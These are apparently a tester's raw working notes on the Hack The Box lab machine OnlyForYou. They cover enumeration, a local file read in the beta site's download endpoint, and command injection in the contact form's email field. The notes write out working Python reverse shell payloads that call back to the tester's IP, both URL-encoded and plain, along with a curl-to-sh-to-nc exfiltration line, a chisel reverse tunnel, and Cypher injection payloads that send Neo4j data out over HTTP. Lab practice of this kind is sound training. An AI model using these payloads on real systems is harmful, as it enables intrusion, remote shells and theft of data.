@@ -1,0 +1,1120 @@
+2023-04-23 15:43:01 CDT -- START TIME
+
+### OnlyForYou ###
+--------------------------------------
+|================================================================
+- Name: only4you
+- IP Address: 10.129.255.111
+- OS: Ubuntu 5.4.0-146-generic/Ubuntu 20.04.6 LTS x64
+- Notes: 
+
+//CREDS:
+// john : ThisIs4You
+
+//Flags:
+#User:		c506c2fb6285dfa447ed5140ad295ab4
+#System:	6c144633876c767c180fd2d9ee893e0b
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=10.129.255.111
+ports=$(nmap -e tun0 -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//22,80
+
+2023-04-23 15:52:33 CDT -- 
+sudo nmap -e tun0 -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
+|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
+|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://only4you.htb/
+
+# UDP scan
+2023-04-23 15:53:20 CDT -- 
+sudo nmap -e tun0 -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.129.255.111\tonly4you.htb' >> /etc/hosts"
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+-- feroxbuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-23 15:59:17 CDT -- 
+feroxbuster -k -u http://only4you.htb -o feroxbuster.out -x php,txt,html,htm,aspx
+
+//JUst this.
+#http://only4you.htb/
+
+2023-04-23 16:22:53 CDT -- 
+feroxbuster -k -u http://beta.only4you.htb -o feroxbuster-beta.out -x php,txt,html,htm,aspx
+
+ http://beta.only4you.htb/
+ http://beta.only4you.htb/download
+ http://beta.only4you.htb/source
+ http://beta.only4you.htb/list
+ http://beta.only4you.htb/convert
+ http://beta.only4you.htb/resize
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// gobuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Running Gobuster to compare with ferox
+// directory brute force
+2023-04-23 16:05:40 CDT -- 
+gobuster dir -u http://only4you.htb -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,htm -o gobuster-80.txt
+//Nothing
+
+2023-04-23 16:08:40 CDT -- 
+// vhost brute force
+gobuster vhost -u only4you.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -o vhost.out
+
+#Found: beta.only4you.htb Status: 200 [Size: 2191]
+
+//Adding beta.only4you.htb to hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// nikto -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-23 16:58:54 CDT -- 
+// scan website
+nikto -h http://only4you.htb
++ Server: nginx/1.18.0 (Ubuntu)
+
+
+2023-04-23 17:03:08 CDT -- 
+nikto -h http://beta.only4you.htb
++ Server: nginx/1.18.0 (Ubuntu)
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// BURP research
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+http://only4you.htb/
+
+Walter White            #Chief Executive Officer
+Sarah Jhonson           #Product Manager
+William Anderson        #Designer
+Amanda Jepson           #Accountant
+
+Email:
+info@only4you.htb
+
+http://beta.only4you.htb/
+
+2023-04-23 16:25:02 CDT -- 
+//Downloaded Source Code
+
+mv ~/Downloads/* .
+
+unzip -l source.zip 
+Archive:  source.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        0  2022-12-04 09:11   beta/
+     4374  2022-11-29 12:23   beta/app.py
+        0  2022-12-04 09:11   beta/static/
+        0  2022-10-31 14:01   beta/static/img/
+      948  2022-10-31 14:00   beta/static/img/image-resize.svg
+        0  2022-11-01 13:22   beta/templates/
+      676  2022-10-31 12:36   beta/templates/400.html
+      677  2022-10-31 12:36   beta/templates/500.html
+     3068  2022-11-01 13:37   beta/templates/convert.html
+     2242  2022-11-01 11:33   beta/templates/index.html
+      683  2022-10-31 12:36   beta/templates/405.html
+     6245  2022-11-03 15:43   beta/templates/list.html
+     3992  2022-11-01 13:37   beta/templates/resize.html
+      674  2022-10-31 12:41   beta/templates/404.html
+        0  2022-11-01 15:23   beta/uploads/
+        0  2022-11-03 15:44   beta/uploads/resize/
+        0  2022-11-03 15:44   beta/uploads/list/
+        0  2022-11-03 15:48   beta/uploads/convert/
+     1721  2022-11-03 15:49   beta/tool.py
+---------                     -------
+    25300                     19 files
+
+//Testing site image functionality
+//Download png image from online as ghost.png
+
+http://beta.only4you.htb/convert
+//This page takes either a jpg or png and creates a download for the opposite uploaded
+
+http://beta.only4you.htb/resize
+//Request
+------WebKitFormBoundarypgYBEbx5vmp1Iydk
+Content-Disposition: form-data; name="file"; filename="ghost.png"
+Content-Type: image/png
+
+...
+
+------WebKitFormBoundarypgYBEbx5vmp1Iydk--
+
+
+http://beta.only4you.htb/list
+//When you select a image the page redirects to look for an image with the size you chose
+
+http://beta.only4you.htb/download
+//Request
+image=100x100.jpg
+
+You should be redirected automatically to the target URL: /list
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Testing LFI/RFI
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+http://beta.only4you.htb/download
+//Request
+image=../../../../../../../etc/passwd
+//FAIL
+
+//Source Code audit
+//app.py
+if '..' in filename or filename.startswith('../'):
+        flash('Hacking detected!', 'danger')
+        return redirect('/list')
+//This filtered my previous request
+
+2023-04-23 17:21:28 CDT -- 
+//Request: Trying PercentEncoding
+image=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+//FAIL
+
+//Request
+image=/etc/passwd
+//SUCCESS
+
+//Creating cURL command
+curl -s -k -X $'POST' http://beta.only4you.htb/download --data-binary $'image=/etc/passwd' 
+
+root:x:0:0:root:/root:/bin/bash
+john:x:1000:1000:john:/home/john:/bin/bash
+neo4j:x:997:997::/var/lib/neo4j:/bin/bash
+dev:x:1001:1001::/home/dev:/bin/bash
+
+2023-04-23 18:18:45 CDT -- 
+curl -s -k -X $'POST' http://beta.only4you.htb/download --data-binary $'image=/etc/shadow'
+//Nothing
+
+//Testing RFI
+2023-04-23 17:29:23 CDT -- 
+echo 'This is Test' > test.txt
+sudo python3 -m http.server 80
+
+//Request
+image=http://10.10.16.25/test.txt
+//FAIL
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Enum WebSite configs
+// nginx 1.18.0 (Ubuntu)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-04-23 18:32:59 CDT -- 
+curl -s -k -X $'POST' http://beta.only4you.htb/download --data-binary $'image=/etc/nginx/nginx.conf'
+
+user www-data;
+worker_processes auto;
+pid /run/nginx.pid;
+include /etc/nginx/modules-enabled/*.conf;
+
+# Logging Settings
+access_log /var/log/nginx/access.log;
+error_log /var/log/nginx/error.log;
+
+# Virtual Host Configs
+include /etc/nginx/conf.d/*.conf;
+include /etc/nginx/sites-enabled/*;
+
+2023-04-23 18:37:22 CDT -- 
+curl -s -k -X $'POST' http://beta.only4you.htb/download --data-binary $'image=/etc/nginx/sites-enabled/default'
+
+server {
+    listen 80;
+    return 301 http://only4you.htb$request_uri;
+}
+
+server {
+        listen 80;
+        server_name only4you.htb;
+
+        location / {
+                include proxy_params;
+                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
+        }
+}
+
+server {
+        listen 80;
+        server_name beta.only4you.htb;
+
+        location / {
+                include proxy_params;
+                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
+        }
+}
+
+
+2023-04-23 18:45:57 CDT -- 
+curl -s -k -X $'POST' http://beta.only4you.htb/download --data-binary $'image=/var/www/beta.only4you.htb/app.py'
+//SUCCESS
+//Pulled app.py and known file location
+
+
+//From Source Download
+ls beta/uploads/
+convert  list  resize
+
+2023-04-23 19:00:00 CDT -- 
+//Upload ghost.png to http://beta.only4you.htb/convert
+curl -s -k -X $'POST' http://beta.only4you.htb/download --data-binary $'image=/var/www/beta.only4you.htb/uploads/convert/ghost.png'
+Warning: Binary output can mess up your terminal. Use "--output -" to tell 
+Warning: curl to output it to your terminal anyway, or consider "--output 
+Warning: <FILE>" to save to a file.
+//SUCCESS, a file is there
+
+2023-04-23 19:00:03 CDT -- 
+curl -s -k -X $'POST' http://beta.only4you.htb/download --data-binary $'image=/var/www/beta.only4you.htb/uploads/list/ghost.png'
+//Nothing
+
+2023-04-23 19:00:06 CDT -- 
+//Upload ghost.png to http://beta.only4you.htb/resize
+curl -s -k -X $'POST' http://beta.only4you.htb/download --data-binary $'image=/var/www/beta.only4you.htb/uploads/resize/ghost.png'
+Warning: Binary output can mess up your terminal. Use "--output -" to tell 
+Warning: curl to output it to your terminal anyway, or consider "--output 
+Warning: <FILE>" to save to a file.
+//SUCCESS, a file is there
+
+#NOTE: Can use either /convert OR /resize for file uploads
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Fuzz files with LFI
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-04-23 19:27:51 CDT -- 
+//Look for etc files
+wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt --hc 302 -X POST -d "image=FUZZ" http://beta.only4you.htb/download > etcFiles.txt
+
+2023-04-23 19:31:16 CDT -- 
+//Look for Python files in beta.only4you.htb
+// /var/www/beta.only4you.htb
+wfuzz -c -w /usr/share/dirb/wordlists/common.txt --hc 302 -X POST -d "image=/var/www/beta.only4you.htb/FUZZ.py" http://beta.only4you.htb/download
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                    
+=====================================================================
+
+000000432:   200        118 L    347 W      4551 Ch     "app"                      
+000004084:   200        42 L     165 W      1721 Ch     "tool"
+
+//Same as the downloaded source ZIP file
+
+//Look for Python files in only4you.htb
+// /var/www/only4you.htb
+wfuzz -c -w /usr/share/dirb/wordlists/common.txt --hc 302 -X POST -d "image=/var/www/only4you.htb/FUZZ.py" http://beta.only4you.htb/download
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                    
+=====================================================================
+
+000000432:   200        44 L     114 W      1297 Ch     "app"                      
+000001662:   200        73 L     194 W      2025 Ch     "form"
+
+// THe Files app.py and form.py were found
+
+mkdir main
+
+2023-04-23 19:38:42 CDT -- 
+//Pulling app.py
+curl -s -k -X $'POST' http://beta.only4you.htb/download --data-binary $'image=/var/www/only4you.htb/app.py' -o ./main/app.py
+
+2023-04-23 19:41:51 CDT -- 
+//Pulling form.py
+curl -s -k -X $'POST' http://beta.only4you.htb/download --data-binary $'image=/var/www/only4you.htb/form.py' -o ./main/form.py
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Testing form.py
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
+
+//As long as the email is in a valid format, it will also run any commands given
+
+2023-04-23 20:11:56 CDT -- 
+//Request
+name=TEST&email=TEST%40test.com%3bping%20-c4%2010.10.16.25&subject=BLAH&message=THis+is+a+test
+//SUCCESS
+
+2023-04-23 20:13:55 CDT -- 
+//Create cURL Command for request
+curl -s -k -X $'POST' http://only4you.htb/ --data-binary $'name=TEST&email=TEST%40test.com%3bping%20-c4%2010.10.16.25&subject=BLAH&message=THis+is+a+test'
+//SUCCESS
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// RevShell
+//SUCCESS
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//StartListener
+sudo rlwrap -cAr nc -lvnp 443
+
+//Trying /bin/bash
+2023-04-23 20:16:53 CDT -- 
+curl -s -k -X $'POST' http://only4you.htb/ --data-binary $'name=TEST&email=TEST%40test.com%3b%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.25%2F443%200%3E%261&subject=BLAH&message=THis+is+a+test'
+//FAIL
+
+//Trying Python3
+2023-04-23 20:23:45 CDT -- 
+curl -s -k -X $'POST' http://only4you.htb/ --data-binary $'name=TEST&email=TEST%40test.com%3bpython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.16.25%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27&subject=BLAH&message=THis+is+a+test'
+//SUCCESS
+
+//RevSHell NOT URL encoded
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.25",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+# I'm IN! 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// ENUM (www-data)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-04-23 20:31:33 CDT -- 
+//Create Working directory
+mktemp -d 
+
+#/tmp/tmp.YDPDEjl1cR
+
+sudo -ll
+//Do not know password for www-data
+
+2023-04-23 20:34:22 CDT -- 
+ps -ef fw
+//Nothing of interest
+
+netstat -antp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1022/nginx: worker  
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0    172 10.129.255.111:38190    10.10.16.25:443         ESTABLISHED 11762/python3       
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -                   
+tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -
+
+//Interesting Ports not shown in original Nmap
+127.0.0.1:3000
+127.0.0.1:8001
+127.0.0.1:33060
+127.0.0.1:3306
+//tcp6
+127.0.0.1:7687
+127.0.0.1:7474
+
+uname -a
+Linux only4you 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+
+cat /etc/*lease
+//PRETTY_NAME="Ubuntu 20.04.6 LTS"
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// privesc --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// install peass
+sudo apt install -y peass
+
+// get a copy of linpeas shell script or binary
+cp /usr/share/peass/linpeas/linpeas.sh .
+
+2023-04-23 20:39:58 CDT -- 
+which curl
+/usr/bin/curl
+
+cd /tmp/tmp.YDPDEjl1cR
+
+// download, execute from memory, & save output on kali
+  // kali term1
+sudo python3 -m http.server 80
+  // kali term2
+nc -lvnp 443 | tee linpeas.out
+
+2023-04-23 20:42:38 CDT -- 
+  // target
+curl 10.10.16.25:80/linpeas.sh | sh | nc 10.10.16.25 443
+
+
+less -r linpeas.out
+
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+Potentially Vulnerable to CVE-2022-2588
+
+╔══════════╣ Executing Linux Exploit Suggester
+[+] [CVE-2022-2586] nft_object UAF
+[+] [CVE-2021-4034] PwnKit
+[+] [CVE-2021-3156] sudo Baron Samedit
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+╔══════════╣ MySQL version
+mysql  Ver 8.0.32-0ubuntu0.20.04.2 for Linux on x86_64 ((Ubuntu)) 
+
+╔══════════╣ Searching mysql credentials and exec
+From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user          = mysql                              Found readable /etc/mysql/my.cnf
+
+╔══════════╣ Analyzing MariaDB Files (limit 70)
+-rw------- 1 root root 317 Mar 29 14:55 /etc/mysql/debian.cnf
+
+╔══════════╣ Searching tmux sessions
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                                                           
+tmux 3.0a                                                                                                /tmp/tmux-33
+
+╔══════════╣ Analyzing Neo4j Files (limit 70)
+-rw-r--r-- 1 root root 733 Nov 21 07:59 /etc/default/neo4j
+
+-rwxr-xr-x 1 root root 2969 Dec  4 22:22 /etc/init.d/neo4j
+
+drwxr-x--- 2 neo4j adm 4096 Mar 30 11:51 /etc/neo4j
+
+-rwxr-xr-x 1 root root 259 Mar 23 15:01 /usr/bin/neo4j
+
+drwxr-sr-x 12 root staff 4096 Mar 30 11:51 /usr/local/lib/python3.8/dist-packages/neo4j
+
+drwxr-xr-x 2 root root 4096 Mar 30 11:51 /usr/share/doc/neo4j
+
+-rw-r--r-- 1 root root 312 Mar 23 15:01 /usr/share/lintian/overrides/neo4j
+
+drwxr-x--- 7 neo4j adm 4096 Mar 30 11:51 /usr/share/neo4j
+
+drwxr-x--- 10 neo4j adm 4096 Mar 30 11:51 /var/lib/neo4j
+                                                                                                                                                 
+drwxr-xr-x 2 neo4j adm 4096 Mar 30 12:08 /var/log/neo4j
+
+
+
+╔══════════╣ Analyzing Interesting logs Files (limit 70)
+-rw-r----- 1 www-data adm 3495917 Apr 24 01:25 /var/log/nginx/access.log
+
+-rw-r----- 1 www-data adm 286 Apr 24 01:25 /var/log/nginx/error.log
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// chisel
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+sudo apt install chisel
+
+// download chisel for linux
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
+gunzip chisel_1.8.1_linux_amd64.gz
+chmod +x chisel_1.8.1_linux_amd64
+mv chisel_1.8.1_linux_amd64 chisel
+
+
+// linux server with target client calling back
+  // kali
+sudo chisel server --port 6969 --reverse --socks5
+//somvvrvrbE2BBFWkwMFRaw+BgZWhURSrGVvuflJavxw=
+
+
+  // target
+// upload chisel.exe
+cd /tmp/tmp.YDPDEjl1cR
+
+2023-04-23 21:20:57 CDT -- 
+wget http://10.10.16.25:80/chisel
+
+2023-04-23 21:24:23 CDT -- 
+// socks5 proxy
+./chisel client --fingerprint somvvrvrbE2BBFWkwMFRaw+BgZWhURSrGVvuflJavxw= 10.10.16.25:6969 R:9050:socks
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// nmap through chisel proxy
+//tcp:	3000,8001,33060,3306
+//tcp6:	7687,7474
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=127.0.0.1
+ports=3000,8001,33060,3306
+
+echo $ports
+// 3306,222,53,3000,5000,39893
+
+//CHange config line
+sudo vim /etc/proxychains4.conf
+//socks5  127.0.0.1 9050
+
+2023-04-23 21:29:04 CDT --  
+proxychains4 -q nmap -Pn -A -p$ports $ip -oN tcp_proxy.nmap
+
+3000/tcp  open  ppp?
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+|     Set-Cookie: i_like_gogs=8890cf76ac1b1904; Path=/; HttpOnly
+|     Set-Cookie: _csrf=FKQ6GBY0jzwGhB3g-r-rJtS53pE6MTY4MjMwNDQwMDY5MTEwOTMyMA; Path=/; Domain=127.0.0.1; Expires=Tue, 25 Apr 2023 02:46:40 GMT; HttpOnly
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: DENY
+|     Date: Mon, 24 Apr 2023 02:46:40 GMT
+|     <!DOCTYPE html>
+|     <html>
+|     <head data-suburl="">
+|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+|     <meta name="author" content="Gogs" />
+|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
+|     <meta name="keywords" content="go, git, self-hosted, gogs">
+|     <meta name="referrer" content="no-referrer" />
+|     <meta name="_csrf" content="FKQ6GBY0jzwGhB3g-r-rJtS53pE6MTY4MjMwNDQwMDY5MTEwO
+|   HTTPOptions: 
+|     HTTP/1.0 500 Internal Server Error
+|     Content-Type: text/plain; charset=utf-8
+|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+|     X-Content-Type-Options: nosniff
+|     Date: Mon, 24 Apr 2023 02:46:55 GMT
+|     Content-Length: 108
+|_    template: base/footer:15:47: executing "base/footer" at <.PageStartTime>: invalid value; expected time.Time
+3306/tcp  open  mysql   MySQL 8.0.32-0ubuntu0.20.04.2
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.32-0ubuntu0.20.04.2
+|   Thread ID: 349
+|   Capabilities flags: 65535
+|   Some Capabilities: IgnoreSigpipes, Speaks41ProtocolOld, Speaks41ProtocolNew, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsCompression, FoundRows, SwitchToSSLAfterHandshake, Support41Auth, ConnectWithDatabase, LongPassword, SupportsTransactions, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: arVk5z\x1B\x15 <\x0C.<=<XG8_\x1B
+|_  Auth Plugin Name: caching_sha2_password
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.31_Auto_Generated_Server_Certificate
+| Not valid before: 2022-11-30T20:23:26
+|_Not valid after:  2032-11-27T20:23:26
+8001/tcp  open  http    Gunicorn 20.0.4
+|_http-server-header: gunicorn/20.0.4
+| http-title: Login
+|_Requested resource was /login
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame."
+|_    HY000
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// WebBrowse through Chisel Proxy/BURP
+// Change Settings in BURP to go through SOCKS5 proxy
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Browse
+http://127.0.0.1:3000
+#Gogs default site
+##A painless self-hosted Git service
+//Repositories: None
+//Users:
+	administator
+	john
+//Organizations: None
+
+#Tried Creds:
+//admin:admin
+//administrator:admin
+//gogsadmin:admin123
+//administrator:admin123
+//john:admin
+//john:admin123
+
+# NEED CREDS
+
+//Browse
+http://127.0.0.1:8001
+#Gunicorn 20.0.4
+
+// login page
+  // Username:  admin
+  // Password:  admin
+
+//Browse
+http://127.0.0.1:7474
+## Neo4j default page, tries to connect on port 7687
+
+#Tried Creds:
+//neo4j:neo4j
+//admin:admin
+
+#Possible Avenue
+https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+########
+#BREAK
+#######
+
+2023-04-25 20:28:22 CDT -- BACK!!!
+
+// REBIRTH
+// 10.129.206.45
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.129.206.45\tonly4you.htb' >> /etc/hosts"
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2023-04-25 20:34:21 CDT -- 
+//StartListener
+sudo rlwrap -cAr nc -lvnp 443
+
+2023-04-25 20:34:40 CDT -- 
+//Python3 RevShell
+curl -s -k -X $'POST' http://only4you.htb/ --data-binary $'name=TEST&email=TEST%40test.com%3bpython3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.16.7%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27&subject=BLAH&message=THis+is+a+test'
+//SUCCESS
+
+mktemp -d
+/tmp/tmp.V25zWyypqv
+
+cd /tmp/tmp.V25zWyypqv
+
+// chisel
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+sudo apt install chisel
+
+// chisel for linux is previously downloaded as a chisel x64 elf
+
+
+// linux server with target client calling back
+  // kali
+sudo chisel server --port 6969 --reverse --socks5
+//MjQpI8z6s6lBz4RQ3Dc9XFahdmflhx5knUUkKiuPa8k=
+
+sudo python3 -m http.server 80
+
+  // target
+// upload chisel.exe
+2023-04-25 20:45:27 CDT -- 
+wget http://10.10.16.7:80/chisel
+
+chmod +x chisel
+
+2023-04-25 20:45:35 CDT -- 
+// socks5 proxy
+./chisel client --fingerprint MjQpI8z6s6lBz4RQ3Dc9XFahdmflhx5knUUkKiuPa8k= 10.10.16.7:6969 R:9050:socks
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2023-04-25 20:48:44 CDT -- 
+//Open a second RevShell
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//Set up browser through the chisel SOCKS5 proxy
+
+// Only4You
+// http://127.0.0.1:8001
+// Cypher Injection (neo4j)
+// Login:
+	User: admin
+	Pass: admin
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j
+
+// http://127.0.0.1:8001/employees
+// Has vuln search function
+
+//Trying Cypher Injection
+' OR 1=1 WITH 0 as _l00 {…} RETURN 1 //
+//FAIL-500 Server Error
+
+'=' {…} WITH 0 as _l00 RETURN 1 //
+a {…} WITH 0 as _l00 RETURN 1 //
+//FAIL
+
+//Trying HTTP Exfiltration
+//Kali
+sudo python3 -m http.server 8000
+
+
+// Injection to get all the procedures
+' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'http://10.10.16.7:5000/' + name as _l RETURN 1 // 
+//FAIL-500 Server Error
+
+2023-04-25 21:20:05 CDT -- 
+//Get Server Version
+' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.16.7:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
+
